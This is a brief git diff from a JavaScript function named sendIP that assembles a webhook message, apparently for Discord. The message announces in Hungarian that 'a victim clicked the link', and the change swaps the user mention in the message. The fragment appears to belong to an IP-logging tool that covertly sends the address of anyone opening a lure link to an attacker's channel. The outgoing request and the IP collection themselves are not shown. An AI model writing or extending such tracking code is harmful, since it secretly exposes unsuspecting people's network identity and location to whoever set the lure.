@@ -15,7 +15,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "Helyszíni Naplózó <3", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
-                            content: `@sz4by`,
+                            content: `<@1095731086513930260>`,
                             embeds: [
                                 {
                                     title: 'Egy áldozat rákattintott a linkre!',
